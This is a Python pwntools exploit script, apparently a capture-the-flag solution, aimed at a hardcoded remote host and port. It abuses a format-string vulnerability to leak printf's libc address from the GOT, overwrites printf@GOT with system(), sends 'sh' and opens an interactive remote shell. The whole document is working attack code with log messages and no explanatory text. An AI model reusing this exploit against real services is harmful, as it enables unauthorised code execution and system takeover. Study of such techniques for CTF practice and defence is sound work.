from pwn import *
import re

host = '140.115.59.7'
port = 11009
y = remote( host , port )

printf_got = 0x804a010
printf_offset = 0x49590
read_got = 0x804a00c
read_offset = 0xd5c00

system_offset = 0x3ad80

def pp(pay):
    p = pay + '|END\n\x00'
    y.sendline(p)

sleep(1)
y.recvline()
y.recvline()
y.recvline()

pp('%6$x')
_6 = y.recvuntil('|END\n')[:-5]
log.success('Got %6$x {}'.format(_6))

pp('%10$x')
_10 = y.recvuntil('|END\n')[:-5]
log.success('Got %10%$x {}'.format(_10))
ad2 = _10[6:8]
log.success('Switch least bytes \\x{}'.format(ad2))

ad = hex(printf_got)[2:].rjust(8,'0')

lo = log.progress('')
lo.status('Writing low 2 bytes of printf_got to %14$x ...')
a = '%.' + str( int( ad[4:] , 16 ) + 0x0 ) + 'x%10$hn'
pp( a )    #____xxxx + 10
y.recvuntil('END\n')
sleep(1)
lo.success('%14$x = 0xXXXX{}'.format(ad[4:]))

lo = log.progress('')
lo.status('Switching $10$x to $14$x + 0x2 ...')
a = '%.'+str(int(ad2,16)+2)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)
lo.success(hex(int(ad2,16)+2))

lo = log.progress('')
lo.status('Writing high 2 bytes of printf_got to %14$x + 0x2 ...')
a = '%.' + str( int( ad[:4] , 16 ) ) + 'x%10$hn'
pp( a )    #xxxx____
y.recvuntil('END\n')
sleep(1)
lo.success('%14$x = 0x{}'.format(ad))

lo = log.progress('')
lo.status('Switching $10$x to $15$x ...')
a = '%.'+str(int(ad2,16)+4)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)
lo.success(hex(int(ad2,16)+4))

lo = log.progress('')
lo.status('Writing low 2 bytes of printf_got + 0x2 to %15$x ...')
a = '%.' + str( int( ad[4:] , 16 ) + 0x2 ) + 'x%10$hn'
pp( a )    #xxxx____
y.recvuntil('END\n')
sleep(1)
lo.success('%15$x = 0xXXXX{}'.format(ad[4:]))

lo = log.progress('')
lo.status('Switching $10$x to $15$x + 0x2 ...')
a = '%.'+str(int(ad2,16)+6)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)
lo.success(hex(int(ad2,16)+6))

lo = log.progress('')
lo.status('Writing high 2 bytes of printf_got + 0x2 to %15$x + 0x2 ...')
a = '%.' + str( int( ad[:4] , 16 ) ) + 'x%10$hn'
pp( a )    #xxxx____
y.recvuntil('END\n')
sleep(1)
lo.success('%15$x = {}'.format(hex(int(ad,16) + 2)))

lo = log.progress('')
lo.status('Switching $10$x to $14$x - 0x2 to prevent resusing previous formatstring ...')
a = '%.'+str(int(ad2,16)-2)+'x%6$hhn'
pp( a )
y.recvuntil('END\n')
sleep(1)
lo.success('Done!')

"""
a = '%.2052x%15$hn%.38924x%14$hn'  # 40976 - 2052 = 38924
pp( a )
y.recvuntil('END\n')
sleep(1)
"""

lo = log.progress('')
lo.status('Leaking printf_got value ...')
pp( '%14$s' )
leak = y.recvuntil('END\n')
log.info(leak)
printf_addr = u32(leak[:4])
sleep(1)
lo.success(hex(printf_addr))

libc_base = printf_addr - printf_offset
system_addr = libc_base + system_offset

log.info('libc_base {}'.format(hex(libc_base)))
log.info('system {}'.format(hex(system_addr)))

ad3 = hex(system_addr)[2:].rjust(8,'0')

log.success('front size: {} back size {}'.format(int( ad3[:4] , 16 ) , int( ad3[4:] , 16 )))

lo = log.progress('')
lo.status('Writing printf_got to system() ...')
a = '%.'+str(int( ad3[4:] , 16 ))+'x%14$hn'+'%.'+str( int( ad3[:4] , 16 ) - int( ad3[4:] , 16 ) )+'x%15$hn'
pp( a )
y.recvuntil('END\n')
sleep(1)
lo.success('Printf() = System()')

lo = log.progress('')
lo.status('Sending first parameter for printf actailly for system !')
y.sendline('sh\x00')
lo.success('Sent \'sh\\x00\'')

log.success('Enjoy the Shell !')



y.interactive()
